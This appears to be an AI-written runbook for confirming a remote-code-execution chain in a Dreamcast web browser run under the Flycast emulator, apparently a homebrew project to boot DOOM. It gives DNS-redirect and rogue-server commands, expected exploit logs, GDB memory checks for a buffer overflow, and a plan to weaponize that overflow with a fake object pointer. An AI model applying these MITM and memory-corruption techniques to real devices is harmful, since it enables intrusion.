# Flycast runbook — confirm the attack path

What was verified in the dev sandbox vs. what you must run yourself:

- ✅ **Flycast v2.6 boots the browser**: launching `flycast Internet\ Browser\ V3.0…gdi`
  recognizes **Game ID `T31901N`**, boots via **reios HLE BIOS** (no real DC BIOS
  needed), software GL is fine (llvmpipe). The disc + emulator baseline works.
- ❌ **Live exploit run could not be done in the sandbox**: no `sudo` (so port 80 —
  the Eden server port — can't bind), no `xdotool`/`wmctrl` to drive the browser,
  shared X display. None of these are attack-design problems; they're environment
  limits. On your own machine the steps below complete the confirmation.

## Prereqs (your machine)
- Flycast (the AppImage works: `flycast-x86_64.AppImage`).
- This repo built: `./build.sh && python3 make_wad.py && python3 make_splash.py`.
- `sudo` (for binding :80 and :53). One box can host both the DNS + Eden server.

## Network: make the DC reach your rogue Eden server
The browser talks to `eden.planetweb.com:80`. Two pieces: DNS → you, and an HTTP
server on :80.

1. **Flycast networking**: Settings → Network → enable **Broadband Adapter**
   (gives the guest a TCP/IP stack). Set the **DNS** field to your host's LAN IP
   (the box running the scripts). If your browser build is modem-only, enable the
   modem and use the same DNS.
2. **DNS redirect** (turnkey): `sudo python3 dns_redirect.py <YOUR_IP>`
   (answers `*.planetweb.com` → YOUR_IP; add `--all` to catch everything).
3. **Eden server on :80**: `sudo python3 eden_mitm.py --chain <chain> -p 80`.

## Run order (try chains in this order)
Each prints `[1]..[5]` as the console walks the chain; `[5] serving pwn.jar` is
code execution.

### 1) `--chain splash`  (smallest moving part — confirm RCE end-to-end)
```
sudo python3 dns_redirect.py <YOUR_IP> &
sudo python3 eden_mitm.py --chain splash -p 80
```
Boot the GD-ROM in Flycast, let the browser connect.
**Expect:** server logs `[1] edenclient.conf → [2] login → [3] discovery →
[4] subscribe → [5] pwn.jar`, then the browser navigates by itself to the
full-screen **Junkyard "PWNED" splash** (`junkyard.html` + `junkyard.gif`).
→ RCE chain confirmed.

### 2) `--chain jdoom`  (real WAD/BSP DOOM in the Java VM)
```
sudo python3 eden_mitm.py --chain jdoom -p 80
```
**Expect:** after `[5]`, server also serves `doom.jar` then `doom.wad` (~1.4 MB),
and an AWT window opens running **Freedoom E1M1** (arrows/WASD move, `,`/`.`
strafe, ESC quit). Framerate will be low (interpreted SH4 + llvmpipe) but real.

### 3) `--chain native`  (sendCommand bridge recon)
```
sudo python3 eden_mitm.py --chain native -p 80
```
**Expect:** after `[5]`, a `POST /report` arrives; server prints the live code
map and writes `native_report.txt`. Then:
```
python3 native/analyze_report.py native_report.txt
```
This confirms which native commands are actually reachable and flags any
undocumented/hang/cast candidates.

## Confirm the native overflow (the part that needs the device)
Two things from the static RE must be checked live:

**A. No length clamp on `setRawDeviceID`** (the overflow precondition).
Flycast has a **GDB stub**: enable it (Settings → Advanced → *Enable GDB server*,
or run with the debugger), then:
```
sh-elf-gdb         # or gdb-multiarch
(gdb) target remote :3263          # Flycast's GDB port
(gdb) x/8xb 0x8c29abe6             # device-ID field BEFORE
# (let the native chain call setRawDeviceID(new byte[256]) -- or add a probe call)
(gdb) x/64xb 0x8c29abe6            # AFTER: bytes past +8 overwritten => no clamp
(gdb) x/1xw 0x8c29ac28             # the object pointer at +0x42 -- corrupted?
```
If `0x8c29abe6+8..` and `0x8c29ac28` change, the **fixed-address BSS overflow is
real** and the VM marshalling didn't clamp.

**B. The call-through-field displacement.** Break at `0x8c032476` / `0x8c034b86`
(the virtual-call sites), inspect how `*(0x8c29ac28)` is dereferenced to reach the
called pointer; that displacement is what your fake object must satisfy.

Once A+B hold, weaponize: a `native`-chain variant that calls
`setRawDeviceID` with bytes whose `[0x42:0x46]` point at a fake object (a pinned
Java `byte[]` you fill), whose method field = an SH4 stub that loads + runs the
staged `doom.bin`.

## Tip
If you can't easily get :80/:53, run everything on one Linux host as root, set
Flycast's DNS to `127.0.0.1` only if Flycast routes guest DNS through the host
loopback (BBA usually needs a real/LAN IP — use the host's LAN IP, not loopback).
